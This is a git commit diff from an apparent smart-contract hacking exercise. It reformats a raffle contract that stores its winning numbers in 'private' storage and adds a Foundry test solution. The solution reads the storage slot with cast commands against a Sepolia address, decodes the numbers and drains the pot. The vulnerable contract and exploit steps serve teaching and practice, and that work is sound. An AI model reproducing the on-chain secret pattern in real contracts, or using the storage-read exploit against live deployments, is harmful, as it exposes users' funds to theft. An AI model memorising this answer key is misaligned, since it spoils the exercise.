9572303274afb522e42bf882b4ee568aaedea617
firatstory.eth <talefirat@gmail.com>
2024-04-26 17:37:50 +0200

    feat: :sparkles: add TestSOCD3.test

--- src/sensitive-on-chain-data-3/CrypticRaffle.sol
+++ src/sensitive-on-chain-data-3/CrypticRaffle.sol
@@ -6,46 +6,42 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract CrypticRaffle is Ownable, ReentrancyGuard {
+    uint256 public constant PARTICIPIATION_PRICE = 0.01 ether;
+    bool private isActive = false;
+    uint256 raffleId;
 
-  uint256 constant public PARTICIPIATION_PRICE = 0.01 ether;
-  bool private isActive = false;
-  uint256 raffleId;
-  
-  // 3 Numbers between 0-255
-  // Example: [53, 0, 123]
-  mapping(uint256 => uint8[3]) private raffles;
+    // 3 Numbers between 0-255
+    // Example: [53, 0, 123]
+    mapping(uint256 => uint8[3]) private raffles;
 
-  constructor() payable {}
+    constructor() payable {}
 
-  function newRaffle(uint8[3] calldata numbers) external onlyOwner {
-    raffleId += 1;
-    raffles[raffleId] = numbers;
-    isActive = true;
-  }
-
-  function guessNumbers(uint8[3] calldata numbers) external payable {
-
-    require(isActive, "Raffle is not active");
-    require(numbers.length == 3, "you should guess 3 numbers");
-    require(msg.value == PARTICIPIATION_PRICE, "you should pay 0.1 eth to participate");
-
-    bool succeded = true;
-    
-    // Iterate guessed numbers, use should guess all 3 numbers in the right order
-    for(uint8 i=0; i < 3; i++) {
-
-      // If user was wrong with one of the numbers, he lost
-      if(numbers[i] != raffles[raffleId][i]) {
-        succeded = false;
-      }
+    function newRaffle(uint8[3] calldata numbers) external onlyOwner {
+        raffleId += 1;
+        raffles[raffleId] = numbers;
+        isActive = true;
     }
 
-    // Send bounty and close the raffle if the user won (until next raffle is live)
-    if(succeded) {
-      isActive = false;
-      (bool sent, ) = msg.sender.call{value: address(this).balance}("");
-      require(sent, "Failed to send ETH");
-    }
-  }
+    function guessNumbers(uint8[3] calldata numbers) external payable {
+        require(isActive, "Raffle is not active");
+        require(numbers.length == 3, "you should guess 3 numbers");
+        require(msg.value == PARTICIPIATION_PRICE, "you should pay 0.01 eth to participate");
 
+        bool succeded = true;
+
+        // Iterate guessed numbers, use should guess all 3 numbers in the right order
+        for (uint8 i = 0; i < 3; i++) {
+            // If user was wrong with one of the numbers, he lost
+            if (numbers[i] != raffles[raffleId][i]) {
+                succeded = false;
+            }
+        }
+
+        // Send bounty and close the raffle if the user won (until next raffle is live)
+        if (succeded) {
+            isActive = false;
+            (bool sent,) = msg.sender.call{value: address(this).balance}("");
+            require(sent, "Failed to send ETH");
+        }
+    }
 }
--- test/sensitive-on-chain-data-3/TestSOCD3.t.sol
+++ test/sensitive-on-chain-data-3/TestSOCD3.t.sol
@@ -6,10 +6,10 @@ import "forge-std/console.sol";
 import "./ICrypticRaffle.sol";
 
 /**
- * @dev run "forge test -vvv --fork-url goerli --fork-block-number 8660077 --match-contract SOCD3"
+ * @dev run "forge test -vvv --fork-url sepolia --fork-block-number 5782311 --match-contract SOCD3"
  */
 contract TestSOCD3 is Test {
-    address constant CRYPTIC_RAFFLE = address(0xca0B461f6F8Af197069a68f5f8A263b497569140);
+    address constant CRYPTIC_RAFFLE = address(0x142798162D7ce789C6730B6635c20475B593eeca);
     uint256 constant PARTICIPATION_PRICE = 0.01 ether;
 
     address attacker = makeAddr("attacker");
@@ -21,14 +21,15 @@ contract TestSOCD3 is Test {
     uint256 initialCrypticRaffleBalance;
 
     function setUp() public {
-        /** SETUP, DON'T CHANGE */
+        /**
+         * SETUP, DON'T CHANGE
+         */
 
         // Set initial balances
         vm.deal(attacker, 0.01 ether);
         vm.deal(gambler1, 1 ether);
         vm.deal(gambler2, 1 ether);
 
-        
         attackerInitialBalance = attacker.balance;
         console.log("Attacker initial balance: ", attackerInitialBalance);
 
@@ -36,40 +37,66 @@ contract TestSOCD3 is Test {
         crypticRaffle = ICrypticRaffle(CRYPTIC_RAFFLE);
 
         // gambler1 is trying his strategy
-		for (uint8 i = 0; i < 100; i++) {
+        for (uint8 i = 0; i < 100; i++) {
             uint8[3] memory numbers;
             numbers[0] = i;
             numbers[1] = i + 20;
             numbers[2] = 100 - i;
             vm.prank(gambler1);
-            crypticRaffle.guessNumbers{ value: PARTICIPATION_PRICE }(numbers);
-		}
+            crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);
+        }
 
         // gambler2 is trying his strategy
-		for (uint8 i = 0; i < 100; i++) {
+        for (uint8 i = 0; i < 100; i++) {
             uint8[3] memory numbers;
             numbers[0] = i + 1;
             numbers[1] = i + 2;
             numbers[2] = 0;
             vm.prank(gambler2);
-            crypticRaffle.guessNumbers{ value: PARTICIPATION_PRICE }(numbers);
-		}
+            crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);
+        }
 
         initialCrypticRaffleBalance = address(crypticRaffle).balance;
         console.log("CrypticRaffle initial balance (pot): ", initialCrypticRaffleBalance);
     }
 
     function testCrypticRaffle() public {
-        /** CODE YOUR SOLUTION HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        //  Slot 0 = address private _owner from Ownable
+        //  Slot 1 = uint256 private _status from Reentrancy Guard
+        //  Slot 2 = bool private isActive
+        //  Slot 3 = uint256 raffleId
+        //  Slot 4 = mapping(uint256 => uint8[3]) private raffles;
 
-        /** SUCCESS CONDITIONS */
+        vm.startPrank(attacker);
+
+        // cast index uint256 1 4 // find the raffles[1] storage location = resulted 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05
+
+        // cast storage 0x142798162D7ce789C6730B6635c20475B593eeca --rpc-url sepolia 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05 // access the value of the raffles[1]
+
+        //  0x0000000000000000000000000000000000000000000000000000000000070013 = 13, 0, 07 in hex numbers equals to 19, 0, 7
+
+        // SOLUTION 2
+        uint8[3] memory numbers;
+
+        numbers[0] = 19;
+        numbers[1] = 0;
+        numbers[2] = 7;
+
+        crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);
+
+        /**
+         * SUCCESS CONDITIONS
+         */
 
         // No ETH in the cryptoRaffle contract
         uint256 currentCrypticRaffleBalance = address(crypticRaffle).balance;
         assertEq(currentCrypticRaffleBalance, 0);
 
         // Attacker was able to guess the numbers and get all the ETH
-		// - 0.1 ETH for transaction fees
+        // - 0.1 ETH for transaction fees
         uint256 currentAttackerBalance = attacker.balance;
         assertGt(currentAttackerBalance, attackerInitialBalance + initialCrypticRaffleBalance - PARTICIPATION_PRICE);
     }
